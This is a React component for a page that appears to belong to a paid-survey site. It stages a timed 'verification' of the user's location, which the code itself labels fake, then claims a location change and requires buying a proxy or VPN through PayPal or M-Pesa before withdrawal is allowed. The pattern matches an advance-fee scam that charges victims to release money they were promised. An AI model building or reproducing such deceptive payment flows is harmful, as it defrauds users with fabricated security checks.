import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/GeoWarning.css";

import dcProxyImg from "../assets/us-proxy.png";
import resProxyImg from "../assets/residential-proxy.png";
import catoVpnImg from "../assets/cato-vpn.png";

export default function GeoWarning() {
  const navigate = useNavigate();

  const steps = [
    "Obtaining IP address…",
    "Checking geolocation…",
    "Verifying region eligibility…",
    "Cross-checking survey access…",
    "Verification completed",
  ];

  const [checking, setChecking] = useState(true);
  const [stepIndex, setStepIndex] = useState(0);
  const [purchasedProxy, setPurchasedProxy] = useState(null);

  /* ---------------- Fake verification ---------------- */
  useEffect(() => {
    const stepTimer = setInterval(() => {
      setStepIndex((i) => (i < steps.length - 1 ? i + 1 : i));
    }, 1800);

    const finishTimer = setTimeout(() => {
      setChecking(false);
      clearInterval(stepTimer);
    }, 9000);

    return () => {
      clearInterval(stepTimer);
      clearTimeout(finishTimer);
    };
  }, []);

  /* ---------------- PayPal ---------------- */
  useEffect(() => {
    if (window.paypal) return;

    const script = document.createElement("script");
    script.src =
      "https://www.paypal.com/sdk/js?client-id=Abvr9JQwh4aABOQkIoz7Dn8kcjEaPHlDV49WPqUUR3YfKSvqYF5TBcQj6WiqsAFajtSudQfHugP0tbz8&currency=USD";
    script.async = true;

    script.onload = () => {
      // $5 Datacenter
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "5.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            alert("US Datacenter Proxy activated");
            setPurchasedProxy("dc");
          }),
      }).render("#paypal-5");

      // $10 Residential
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "10.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            alert("US Residential Proxy activated");
            setPurchasedProxy("residential");
          }),
      }).render("#paypal-10");

      // $2.50 Cato VPN
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "2.50" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() => {
            alert("Cato VPN activated");
            setPurchasedProxy("cato");
          }),
      }).render("#paypal-2-5");
    };

    document.body.appendChild(script);
  }, []);

  /* ---------------- PayHero ---------------- */
  const handlePayHero = (link, type) => {
    window.location.href = link;
    setPurchasedProxy(type);
  };

  /* ---------------- Download ---------------- */
  const handleDownload = async () => {
    const token = localStorage.getItem("token");

    const res = await fetch("/api/download/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ product: purchasedProxy }),
    });

    const data = await res.json();
    if (data.token) {
      window.location.href = `/api/download?token=${data.token}`;
    }
  };

  const handleProceedWithdraw = () => {
    if (!purchasedProxy) {
      alert("Purchase a proxy or VPN first");
      return;
    }
    navigate("/withdrawp");
  };

  /* ---------------- UI ---------------- */
  const DownloadLink = () =>
    purchasedProxy ? (
      <button className="download-link active" onClick={handleDownload}>
        ⬇ Download file
      </button>
    ) : (
      <span className="download-link locked">🔒 Download after payment</span>
    );

  return (
    <div className="geo-page">
      <div className="geo-card">
        {checking && (
          <div className="checking-overlay">
            <div className="checking-box">
              <div className="spinner" />
              <p>{steps[stepIndex]}</p>
              <span>Please do not refresh</span>
            </div>
          </div>
        )}

        <div className={`geo-content ${checking ? "blurred" : ""}`}>
          <h1>
            ⚠ Location Change Detected
            <span>You must purchase a verified proxy or VPN</span>
          </h1>

          <div className="proxy-list">
            {/* Datacenter */}
            <div className="proxy-card">
              <img src={dcProxyImg} alt="Datacenter Proxy" />
              <DownloadLink />
              <h3>US Datacenter Proxy</h3>
              <div className="proxy-price">$5.00</div>
              <div id="paypal-5" />
              <button
                className="payhero-btn"
                onClick={() =>
                  handlePayHero(
                    "https://short.payhero.co.ke/s/Eu3pgvZXvToB6A2hCnrEXs",
                    "dc"
                  )
                }
              >
                Pay with M-Pesa
              </button>
            </div>

            {/* Residential */}
            <div className="proxy-card premium">
              <img src={resProxyImg} alt="Residential Proxy" />
              <DownloadLink />
              <h3>US Residential Proxy</h3>
              <div className="proxy-price">$10.00</div>
              <div id="paypal-10" />
              <button
                className="payhero-btn"
                onClick={() =>
                  handlePayHero(
                    "https://short.payhero.co.ke/s/mviUCspWrArjBUGs6jetEg",
                    "residential"
                  )
                }
              >
                Pay with M-Pesa
              </button>
            </div>

            {/* Cato VPN */}
            <div className="proxy-card vpn">
              <img src={catoVpnImg} alt="Cato VPN" />
              <DownloadLink />
              <h3>Cato VPN</h3>
              <div className="proxy-price">$2.50</div>
              <div id="paypal-2-5" />
              <button
                className="payhero-btn"
                onClick={() =>
                  handlePayHero("PAYHERO_CATO_LINK", "cato")
                }
              >
                Pay with M-Pesa
              </button>
            </div>
          </div>

          {!checking && (
            <button
              className="proceed-withdraw-btn"
              onClick={handleProceedWithdraw}
            >
              Proceed & Withdraw
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

